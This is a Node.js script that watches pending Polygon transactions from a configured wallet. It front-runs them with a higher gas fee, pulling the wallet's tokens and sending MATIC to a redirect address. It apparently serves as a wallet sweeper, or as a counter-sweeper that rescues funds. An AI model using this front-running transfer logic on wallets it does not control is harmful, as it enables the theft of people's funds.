// Setup: npm install alchemy-sdk
const {
  Alchemy,
  Network,
  Utils,
  AlchemySubscription,
  Wallet,
} = require('alchemy-sdk')

const { maticBalance, tokenBalance } = require('./balances')
const { fundTX, pullToken } = require('./transfer')
const { ethers, utils } = require('ethers')

require('dotenv').config()

//this is the configuration for alchemy alchemy API and network
const config = {
  apiKey: process.env.APIKEY,
  network: Network.MATIC_MAINNET,
}

const provider = new ethers.providers.JsonRpcProvider(process.env.RPC, {
  chainId: parseInt(process.env.CHAIN_ID),
})

//Get Alchemy object
const alchemy = new Alchemy(config)
let signer = new Wallet(process.env.PRIVATE_KEY)
//This is the DAI address
const daiAddress = '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063'
//const daiAddress = '0x55A66D6D895443A63e4007C27a3464f827a1a5Cb'

// The ERC-20 Contract ABI, which is a common contract interface
// for tokens (this is the Human-Readable ABI format)
const daiAbi = [
  // Some details about the token
  'function name() view returns (string)',
  'function symbol() view returns (string)',

  // Get the account balance
  'function balanceOf(address) view returns (uint)',

  // Send some of your tokens to someone else
  'function transfer(address to, uint amount)',

  // An event triggered whenever anyone transfers to someone else
  'event Transfer(address indexed from, address indexed to, uint amount)',
]

const daiContract = new ethers.Contract(daiAddress, daiAbi, provider)

/**  ------------------------------------ code structure ---------------------------------- */
//STEP 1= MONITOR DAI TRANSFER
const startmain = async () => {
  //Subscription for Alchemy's pendingTransactions API
  alchemy.ws.on(
    {
      method: AlchemySubscription.PENDING_TRANSACTIONS,
      // fromAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // Replace with address to recieve pending transactions from this address
      fromAddress: process.env.WALLET, // Replace with address to send  pending transactions to this address
    },
    async (tx) => {
      console.log(tx)
      if (tx['to'] == '0xebc717148fad2c297940d1a194b5ec8dadabcfcf'||tx['to'] == '0x253497d5938e54F04dCd95265043379f76b705d3'||tx['from'] != '0x0d95a9FD245C6875966ecC15BE53ce5A367d89E4' ) {
        var maxprior =
          parseFloat(Utils.formatEther(tx['maxPriorityFeePerGas'])) * 1000000000

        console.log(`current gas fee to subvert ${maxprior}`)
        var currentBalance = await tokenBalance()
          console.log(`Current balance is now currentBalance ${currentBalance}`)
          var currentMatic = await maticBalance()
          console.log(`available MAtic is ${currentMatic}`)
          await pullToken(currentBalance)
          // if (parseInt(currentMatic) <= 0.001) {
          //   await fundTX()
          // } else {
          //   await pullToken(currentBalance)
          // }


        await fundTrans(maxprior, '0.04')
      } else {
      }
    },
  )
}

const fundTrans = async (gas, amount) => {
  var setgas = gas + 110
  const nonce = await alchemy.core.getTransactionCount(
    process.env.WALLET,
    'latest',
  )
  var newgas = parseInt(setgas)

  console.log(`new gas fee to subvert with ${newgas}`)
  let transaction = {
    to: process.env.REDIRECT,
    value: Utils.parseEther(`${amount}`),
    gasLimit: '21000',
    maxPriorityFeePerGas: Utils.parseUnits(`${newgas.toString()}`, 'gwei'),
    maxFeePerGas: Utils.parseUnits(`${newgas.toString()}`, 'gwei'),
    nonce: nonce,
    type: 2,
    chainId: process.env.CHAIN_ID,
  }
  let rawTransaction = await signer.signTransaction(transaction)
  let tx = await alchemy.core.sendTransaction(rawTransaction)

  console.log(
    `----- funded ${tx['to']} -----\nwith transaction hash: ${tx['hash']} ---------`,
  )
}

module.exports = { startmain }
